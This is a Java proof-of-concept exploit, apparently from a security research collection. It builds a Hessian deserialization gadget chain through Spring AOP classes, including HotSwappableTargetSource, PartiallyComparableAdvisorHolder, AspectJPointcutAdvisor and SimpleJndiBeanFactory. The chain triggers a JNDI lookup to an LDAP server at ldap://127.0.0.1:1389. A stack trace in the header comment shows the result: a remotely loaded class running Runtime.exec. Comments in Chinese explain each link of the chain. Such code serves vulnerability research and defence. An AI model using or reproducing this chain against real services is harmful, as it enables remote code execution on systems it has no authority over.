package com.javasec.pocs.hessian.springaop;
import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.apache.commons.logging.impl.NoOpLog;
import org.springframework.aop.aspectj.AbstractAspectJAdvice;
import org.springframework.aop.aspectj.AspectInstanceFactory;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJPointcutAdvisor;
import org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;
import org.springframework.aop.target.HotSwappableTargetSource;
import org.springframework.jndi.support.SimpleJndiBeanFactory;
import java.util.HashMap;

/**
 * exec:347, Runtime (java.lang)
 * <clinit>:-1, ExecTemplateJDK7
 * forName0:-1, Class (java.lang)
 * forName:348, Class (java.lang)
 * loadClass:72, VersionHelper12 (com.sun.naming.internal)
 * loadClass:87, VersionHelper12 (com.sun.naming.internal)
 * getObjectFactoryFromReference:158, NamingManager (javax.naming.spi)
 * getObjectInstance:189, DirectoryManager (javax.naming.spi)
 * c_lookup:1085, LdapCtx (com.sun.jndi.ldap)
 * p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
 * lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
 * lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
 * lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
 * lookup:417, InitialContext (javax.naming)
 * doInContext:155, JndiTemplate$1 (org.springframework.jndi)
 * execute:87, JndiTemplate (org.springframework.jndi)
 * lookup:152, JndiTemplate (org.springframework.jndi)
 * lookup:179, JndiTemplate (org.springframework.jndi)
 * lookup:95, JndiLocatorSupport (org.springframework.jndi)
 * doGetSingleton:211, SimpleJndiBeanFactory (org.springframework.jndi.support)
 * doGetType:219, SimpleJndiBeanFactory (org.springframework.jndi.support)
 * getType:184, SimpleJndiBeanFactory (org.springframework.jndi.support)
 * getOrder:136, BeanFactoryAspectInstanceFactory (org.springframework.aop.aspectj.annotation)
 * getOrder:223, AbstractAspectJAdvice (org.springframework.aop.aspectj)
 * getOrder:81, AspectJPointcutAdvisor (org.springframework.aop.aspectj)
 * toString:151, AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder (org.springframework.aop.aspectj.autoproxy)
 * equals:392, XString (com.sun.org.apache.xpath.internal.objects)
 * equals:104, HotSwappableTargetSource (org.springframework.aop.target)
 * putVal:634, HashMap (java.util)
 * put:611, HashMap (java.util)
 * readMap:114, MapDeserializer (com.caucho.hessian.io)
 * readMap:577, SerializerFactory (com.caucho.hessian.io)
 * readObject:2093, Hessian2Input (com.caucho.hessian.io)
 * HessianDeserial:275, SerializeUtils (com.javasec.utils)
 * main:45, springaop1 (com.javasec.pocs.hessian.springaop)
 */
public class springaop1 {
    public static void main(String[] args) throws Exception {
        String jndiUrl = "ldap://127.0.0.1:1389/cgefow";
        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
        bf.setShareableResources(jndiUrl);

//反序列化时BeanFactoryAspectInstanceFactory.getOrder会被调用，会触发调用SimpleJndiBeanFactory.getType->SimpleJndiBeanFactory.doGetType->SimpleJndiBeanFactory.doGetSingleton->SimpleJndiBeanFactory.lookup->JndiTemplate.lookup
        SerializeUtils.setFieldValue(bf, "logger", new NoOpLog());
        SerializeUtils.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());

//反序列化时AspectJAroundAdvice.getOrder会被调用，会触发BeanFactoryAspectInstanceFactory.getOrder
        AspectInstanceFactory aif = SerializeUtils.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
        SerializeUtils.setFieldValue(aif, "beanFactory", bf);
        SerializeUtils.setFieldValue(aif, "name", jndiUrl);

//反序列化时AspectJPointcutAdvisor.getOrder会被调用，会触发AspectJAroundAdvice.getOrder
        AbstractAspectJAdvice advice = SerializeUtils.createWithoutConstructor(AspectJAroundAdvice.class);
        SerializeUtils.setFieldValue(advice, "aspectInstanceFactory", aif);

//反序列化时PartiallyComparableAdvisorHolder.toString会被调用，会触发AspectJPointcutAdvisor.getOrder
        AspectJPointcutAdvisor advisor = SerializeUtils.createWithoutConstructor(AspectJPointcutAdvisor.class);
        SerializeUtils.setFieldValue(advisor, "advice", advice);

//反序列化时Xstring.equals会被调用，会触发PartiallyComparableAdvisorHolder.toString
        Class<?> pcahCl = Class.forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
        Object pcah = SerializeUtils.createWithoutConstructor(pcahCl);
        SerializeUtils.setFieldValue(pcah, "advisor", advisor);

//反序列化时HotSwappableTargetSource.equals会被调用，触发Xstring.equals
        HotSwappableTargetSource v1 = new HotSwappableTargetSource(pcah);
        HotSwappableTargetSource v2 = new HotSwappableTargetSource(new XString("xxx"));
        HashMap<Object, Object> hashMap = SerializeUtils.makeMap(v1, v2);
        SerializeUtils.HessianDeserial(SerializeUtils.HessianSerial(hashMap));
    }
}
